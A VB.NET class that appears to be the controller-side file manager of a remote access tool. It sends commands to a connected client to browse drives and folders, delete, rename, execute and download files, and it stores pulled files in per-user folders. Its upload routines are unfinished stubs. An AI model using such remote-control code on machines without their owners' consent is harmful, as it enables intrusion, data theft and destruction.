Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Threading

Public Class clsFileExplorer
    Inherits clsBoneObj

    Const MAX_PATH = 260

    'ERROR code
    Const ERROR_FILE_BROWSER = 1
    Const ERROR_FILE_OPEN = 2

    'DOWNLOAD status
    Public Const DOWNLOAD_INIT = 1
    Public Const DOWNLOAD_PROGRESS = 2
    Public Const DOWNLOAD_FINISH = 3
    Public Const DOWNLOAD_ERROR = 4

    'UPLOAD status
    Public Const UPLOAD_INIT = 1
    Public Const UPLOAD_PROGRESS = 2
    Public Const UPLOAD_FINISH = 3
    Public Const UPLOAD_ERROR = 4

    Structure LITE_WIN32_FIND_DATA
        Dim ftCreationTime As Long
        Dim ftLastWriteTime As Long
        Dim nFileSizeHigh As UInt32
        Dim nFileSizeLow As UInt32
        Dim cFileName As String
        Dim isFolder As Byte
    End Structure

    Structure UploadAttr
        Dim Session As UInteger
        Dim path As String
        Dim status As Byte
        Dim sizeLeft As UInt64
        Dim totalSize As UInt64
        Dim uploadedPath As String
    End Structure

    Class UploadItem
        Public Attr As UploadAttr
        Private fileObj As FileStream
        Private fileExplorerObj As clsFileExplorer

        Public Sub New(ByVal mFileExplorerObj As clsFileExplorer, ByVal srcFilePath As String, ByVal dstFilePath As String)
            fileExplorerObj = mFileExplorerObj
            Attr.Session = Utilities.RandomDWORD()
            Attr.status = UPLOAD_INIT
            Attr.path = srcFilePath
            Attr.totalSize = FileLen(srcFilePath)
            Attr.sizeLeft = 0
            Attr.uploadedPath = dstFilePath
            fileObj = New FileStream(srcFilePath, FileMode.Open)
        End Sub

        Public Sub UploadThread()

            If Not SendUploadBegin() Then
                Attr.status = UPLOAD_ERROR
                Return
            End If
            While Attr.status = UPLOAD_INIT
                Threading.Thread.Sleep(500)
            End While

        End Sub

        Private Function SendUploadBegin() As Boolean
            Dim packet() As Byte = Nothing
            Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
            BinWriter.BufferAddDword(packet, 2)
            BinWriter.BufferAddDword(packet, Attr.Session)
            fileExplorerObj.SendPacket(packet)
        End Function

        Private Sub SendUploadChunk()

        End Sub

        Private Sub SendUploadEnd()

        End Sub
    End Class

    Structure DownloadAttr
        Dim Session As UInteger
        Dim path As String
        Dim status As Byte
        Dim sizeLeft As UInt64
        Dim totalSize As UInt64
        Dim savedPath As String
    End Structure

    Class DownloadItem
        Public Attr As DownloadAttr
        Private fileObj As FileStream

        Public Sub OnDownloadPacketStart(ByVal packet() As Byte)
            Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader()
            Dim chunkSize As Integer = BinReader.BufferReadDWORD(packet, 16)

            Attr.totalSize = BinReader.BufferReadDWORD(packet, 8)
            Attr.sizeLeft = BinReader.BufferReadDWORD(packet, 12)
            Attr.status = DOWNLOAD_PROGRESS
            If fileObj Is Nothing Then
                fileObj = New FileStream(Attr.savedPath, FileMode.Append)
            End If
            fileObj.Write(BinReader.BufferReadBuffer(packet, 20, chunkSize), 0, chunkSize)
        End Sub

        Public Sub OnDownloadPacketProgress(ByVal packet() As Byte)
            Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader()
            Dim chunkSize As Integer = BinReader.BufferReadDWORD(packet, 16)

            Attr.totalSize = BinReader.BufferReadDWORD(packet, 8)
            Attr.sizeLeft = BinReader.BufferReadDWORD(packet, 12)
            If fileObj Is Nothing Then
                fileObj = New FileStream(Attr.savedPath, FileMode.Append)
            End If
            fileObj.Write(BinReader.BufferReadBuffer(packet, 20, chunkSize), 0, chunkSize)
        End Sub

        Public Sub OnDownloadPacketEnd(ByVal packet() As Byte)
            Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader()
            Dim chunkSize As Integer = BinReader.BufferReadDWORD(packet, 16)

            Attr.totalSize = BinReader.BufferReadDWORD(packet, 8)
            Attr.sizeLeft = BinReader.BufferReadDWORD(packet, 12)
            If fileObj Is Nothing Then
                fileObj = New FileStream(Attr.savedPath, FileMode.Append)
            End If
            fileObj.Write(BinReader.BufferReadBuffer(packet, 20, chunkSize), 0, chunkSize)
            fileObj.Close()
            Attr.status = DOWNLOAD_FINISH
        End Sub
    End Class

    Public Sub New(ByVal mConnPool As clsConnection, ByVal mInfoObj As clsInfo)
        Conn = mConnPool
        InfoObj = mInfoObj
    End Sub

    Public Overrides Sub OnInit()
        'Init Obj ID
        ObjID = 3
    End Sub

    Public Overrides Sub OnPacketArrived(ByVal packet() As Byte)
        Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader()
        Dim ID As Byte = BinReader.BufferReadDWORD(packet, 0)

        Select Case ID
            Case 0 ' List all disk
                diskMask = BinReader.BufferReadDWORD(packet, 4)
            Case 1 ' Browse file
                Dim numberOfItems As UInteger = BinReader.BufferReadDWORD(packet, 4)
                Dim Session As UInteger = BinReader.BufferReadDWORD(packet, 8)
                currentPath = System.Text.Encoding.Unicode.GetString(BinReader.BufferReadBuffer(packet, 12, MAX_PATH)).Replace(vbNullChar, "")

                If currentFolderBrowserSession <> Session Then
                    currentFolderItems.Clear()
                    currentFolderBrowserSession = Session
                End If

                For i = 0 To numberOfItems - 1
                    Dim item As LITE_WIN32_FIND_DATA = New LITE_WIN32_FIND_DATA
                    Const SIZE_OF_HEADER = 4 + 4 + 2 * MAX_PATH + 4
                    item = BufferTo_LITE_WIN32_FIND_DATA(BinReader.BufferReadBuffer(packet, SIZE_OF_HEADER + i * 545, 545))
                    If item.cFileName = "." Then Continue For
                    currentFolderItems.Add(item)
                Next
            Case 5, 6, 7 ' File download Begin, Progress, End
                Dim Session As UInteger = BinReader.BufferReadDWORD(packet, 4)
                Dim i As UInteger = GetIndexOfDownloadItemBySession(Session)
                If i <> -1 Then
                    If ID = 5 Then 'File download begin
                        downloadList(i).OnDownloadPacketStart(packet)
                    ElseIf ID = 6 Then
                        downloadList(i).OnDownloadPacketProgress(packet)
                    ElseIf ID = 7 Then
                        downloadList(i).OnDownloadPacketEnd(packet)
                    End If
                End If

            Case 100 ' Error
                Dim ErrorCode As UInteger = BinReader.BufferReadDWORD(packet, 4)
                Select Case ErrorCode
                    Case ERROR_FILE_BROWSER
                        currentPath = ""
                        currentFolderItems.Clear()
                        currentFolderBrowserSession = 0
                End Select
        End Select
    End Sub

    Public Function GetDiskMask() As String
        Return diskMask
    End Function

    Public Sub SendGetDiskMask()
        Dim packet() As Byte = Nothing
        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
        BinWriter.BufferAddDword(packet, 0)
        SendPacket(packet)
    End Sub

    Public Sub SendBrowseFolder(ByVal path As String)
        Dim packet() As Byte = Nothing
        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
        BinWriter.BufferAddDword(packet, 1)
        BinWriter.BufferAddDword(packet, (Len(path) + 1) * 2)
        BinWriter.BufferMerge(packet, System.Text.Encoding.Unicode.GetBytes(path))
        BinWriter.BufferAddWord(packet, 0) ' Add null terminate
        SendPacket(packet)
    End Sub

    Public Sub SendDeleteFile(ByVal path As String)
        Dim packet() As Byte = Nothing
        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
        BinWriter.BufferAddDword(packet, 8)
        BinWriter.BufferAddDword(packet, (Len(path) + 1) * 2)
        BinWriter.BufferMerge(packet, System.Text.Encoding.Unicode.GetBytes(path))
        BinWriter.BufferAddWord(packet, 0) ' Add null terminate
        SendPacket(packet)
    End Sub

    Public Sub SendRenameFile(ByVal oldPath As String, ByVal newPath As String)
        Dim packet() As Byte = Nothing
        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
        BinWriter.BufferAddDword(packet, 9)
        BinWriter.BufferAddDword(packet, (Len(oldPath) + 1) * 2)
        BinWriter.BufferMerge(packet, System.Text.Encoding.Unicode.GetBytes(oldPath))
        BinWriter.BufferAddWord(packet, 0) ' Add null terminate
        BinWriter.BufferAddDword(packet, (Len(newPath) + 1) * 2)
        BinWriter.BufferMerge(packet, System.Text.Encoding.Unicode.GetBytes(newPath))
        BinWriter.BufferAddWord(packet, 0) ' Add null terminate
        SendPacket(packet)
    End Sub

    Public Sub SendExecuteFile(ByVal path As String)
        Dim packet() As Byte = Nothing
        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
        BinWriter.BufferAddDword(packet, 11)
        BinWriter.BufferAddDword(packet, (Len(path) + 1) * 2)
        BinWriter.BufferMerge(packet, System.Text.Encoding.Unicode.GetBytes(path))
        BinWriter.BufferAddWord(packet, 0) ' Add null terminate
        SendPacket(packet)
    End Sub

    Public Sub SendCreateDirectory(ByVal path As String)
        Dim packet() As Byte = Nothing
        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
        BinWriter.BufferAddDword(packet, 10)
        BinWriter.BufferAddDword(packet, (Len(path) + 1) * 2)
        BinWriter.BufferMerge(packet, System.Text.Encoding.Unicode.GetBytes(path))
        BinWriter.BufferAddWord(packet, 0) ' Add null terminate
        SendPacket(packet)
    End Sub

    Public Sub SendDownload(ByVal path As String)
        Dim packet() As Byte = Nothing
        Dim BinWriter As clsArrayBinaryWritten = New clsArrayBinaryWritten
        Dim Session As UInteger = RandomDWORD()

        BinWriter.BufferAddDword(packet, 5)
        BinWriter.BufferAddDword(packet, Session)
        BinWriter.BufferAddDword(packet, (Len(path) + 1) * 2)
        BinWriter.BufferMerge(packet, System.Text.Encoding.Unicode.GetBytes(path))
        BinWriter.BufferAddWord(packet, 0) ' Add null terminate
        SendPacket(packet)

        Dim item As DownloadItem = New DownloadItem()
        item.Attr.savedPath = GetDownloadPath() + TrimPath(path)
        item.Attr.path = path
        item.Attr.sizeLeft = 0
        item.Attr.totalSize = 0
        item.Attr.Session = Session
        item.Attr.status = DOWNLOAD_INIT
        downloadList.Add(item)
    End Sub

    Private Sub UploadThread(ByVal uploadObj As UploadItem)
        uploadObj.UploadThread()
    End Sub

    Public Sub SendUpload(ByVal srcFile As String, ByVal dstFile As String)
        Dim item As UploadItem = New UploadItem(Me, srcFile, dstFile)
        uploadList.Add(item)
        Dim thread As Thread = New Thread(AddressOf UploadThread)
        thread.Start(item)
    End Sub

    Public Function GetCurrentFolderItem() As List(Of LITE_WIN32_FIND_DATA)
        Return currentFolderItems
    End Function

    Public Function GetFolderBrowserSession() As UInteger
        Return currentFolderBrowserSession
    End Function

    Public Function GetCurrentBrowserPath() As String
        Return currentPath
    End Function

    Public Function GetDownloadList() As List(Of DownloadItem)
        Return downloadList
    End Function

    Public Function GetUploadList() As List(Of UploadItem)
        Return uploadList
    End Function

    Public Function GetDownloadPath() As String
        Return Application.StartupPath + "\Users\" + InfoObj.GetClientInfo.computerUserName.Replace("/", "@").Replace(Convert.ToChar(0), "") + "\Downloads\"
    End Function

    'Private
    Dim diskMask As Integer = 0
    Dim currentPath As String
    Dim currentFolderItems As List(Of LITE_WIN32_FIND_DATA) = New List(Of LITE_WIN32_FIND_DATA)
    Dim currentFolderBrowserSession = 0
    Dim InfoObj As clsInfo
    Dim downloadList As List(Of DownloadItem) = New List(Of DownloadItem)()
    Dim uploadList As List(Of UploadItem) = New List(Of UploadItem)()

    Private Function BufferTo_LITE_WIN32_FIND_DATA(ByVal Buffer As Byte())
        Dim result As LITE_WIN32_FIND_DATA
        Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader

        result.ftCreationTime = BinReader.BufferReadQWORD(Buffer, 0)
        result.ftLastWriteTime = BinReader.BufferReadQWORD(Buffer, 8)
        result.nFileSizeHigh = BinReader.BufferReadDWORD(Buffer, 16)
        result.nFileSizeLow = BinReader.BufferReadDWORD(Buffer, 20)
        result.cFileName = System.Text.Encoding.Unicode.GetString(BinReader.BufferReadBuffer(Buffer, 24, MAX_PATH * 2)).Replace(vbNullChar, "")
        result.isFolder = BinReader.BufferReadByte(Buffer, 544) '24 + MAX_PATH * 2
        Return result
    End Function

    Private Function GetIndexOfDownloadItemBySession(ByVal Session As UInteger) As Integer
        For i = 0 To downloadList.Count - 1
            If downloadList(i).Attr.Session = Session Then
                Return i
            End If
        Next
        Return -1
    End Function
End Class
